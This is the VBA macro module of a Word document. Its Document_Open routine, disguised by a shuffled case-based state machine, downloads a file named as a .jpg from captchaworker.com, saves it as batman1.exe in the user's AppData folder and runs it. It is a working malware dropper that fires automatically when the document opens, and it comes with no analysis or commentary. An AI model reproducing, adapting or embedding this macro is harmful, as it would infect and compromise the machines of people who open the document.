Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Private Sub Document_Open()

Dim Superman As Integer
Superman = 1
Do While Superman <> 7
Select Case Superman

Case 5
oStream.Type = 1
Superman = 6

Case 1
Set WinHttpReq = CreateObject("Msxml2.ServerXMLHTTP")
Superman = 2

Case 3
ShellApp.Open Environ("appdata") + "\batman1.exe"
Superman = 7

Case 4
oStream.Open
Superman = 5

Case 8
Set oStream = CreateObject("ADODB.Stream")
Superman = 4

Case 9
WinHttpReq.Send
Superman = 8

Case 10
Set ShellApp = CreateObject("shell.application")
Superman = 3

Case 11
oStream.Close
Superman = 10

Case 6
oStream.Write WinHttpReq.ResponseBody
Superman = 12

Case 2
WinHttpReq.Open "GET", "http://captchaworker.com/oct22.jpg", False
Superman = 9

Case 12
oStream.SaveToFile (Environ("appdata") + "\batman1.exe"), Val(2)
Superman = 11

End Select
Loop

End Sub

















